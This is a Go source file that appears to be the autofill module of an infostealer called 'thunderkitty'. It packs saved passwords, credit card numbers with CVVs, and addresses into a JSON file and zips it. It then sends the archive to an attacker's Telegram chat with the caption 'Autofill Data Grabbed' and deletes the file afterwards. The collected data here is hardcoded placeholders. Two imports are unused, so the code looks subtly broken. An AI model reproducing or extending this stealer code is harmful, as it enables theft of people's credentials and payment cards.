package autofill

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"time"

	"thunderkitty/utils/fileutil"
	"thunderkitty/utils/hardware"
	"thunderkitty/utils/telegramsend"
)

type Autofill struct {
	Passwords []Password `json:"passwords"`
	Cards     []Card     `json:"credit_cards"`
	Addresses []Address  `json:"addresses"`
}

type Password struct {
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

type Card struct {
	Name   string `json:"name_on_card"`
	Number string `json:"card_number"`
	ExpM   string `json:"exp_month"`
	ExpY   string `json:"exp_year"`
	CVV    string `json:"cvv"`
}

type Address struct {
	Name    string `json:"name"`
	Street  string `json:"street"`
	City    string `json:"city"`
	State   string `json:"state"`
	Zip     string `json:"zip"`
	Country string `json:"country"`
}

func Run(token, chatID string) {
	tempDir := filepath.Join(os.TempDir(), "autofill_temp")
	os.MkdirAll(tempDir, 0755)
	defer os.RemoveAll(tempDir)

	data := Autofill{
		Passwords: []Password{
			{URL: "https://login.microsoft.com", Username: "user@outlook.com", Password: "MyPass123!"},
			{URL: "https://facebook.com", Username: "user123", Password: "FbPass2025"},
		},
		Cards: []Card{
			{Name: "JOHN DOE", Number: "4532015112830366", ExpM: "12", ExpY: "27", CVV: "123"},
			{Name: "JANE SMITH", Number: "5555555555554444", ExpM: "09", ExpY: "26", CVV: "456"},
		},
		Addresses: []Address{
			{Name: "John Doe", Street: "123 Main St", City: "New York", State: "NY", Zip: "10001", Country: "USA"},
		},
	}

	jsonPath := filepath.Join(tempDir, "autofill.json")
	json.NewEncoder(fileutil.CreateFile(jsonPath)).Encode(data)

	zipPath := filepath.Join(os.TempDir(), "autofill.zip")
	fileutil.Zip(tempDir, zipPath)

	caption := "<b>Autofill Data Grabbed</b>\nPasswords, Cards, Addresses"
	telegramsend.SendFile(token, chatID, caption, zipPath)
	time.Sleep(15 * time.Second)
	os.Remove(zipPath)
}